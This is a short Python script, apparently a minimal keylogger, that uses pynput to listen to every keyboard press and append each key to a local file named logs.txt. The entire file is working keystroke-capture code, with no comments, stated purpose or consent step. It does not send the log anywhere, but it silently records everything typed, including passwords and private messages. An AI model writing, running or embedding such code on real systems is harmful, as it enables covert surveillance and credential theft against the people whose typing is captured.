from pynput.keyboard import Listener
  
def on_press(key):
    
    with open("./logs.txt", "a") as f:
        try: 
            f.write(f"{key.char} \n")
        except:
            f.write(f"{key} \n")

with Listener(on_press= on_press) as listener:              
    listener.join()
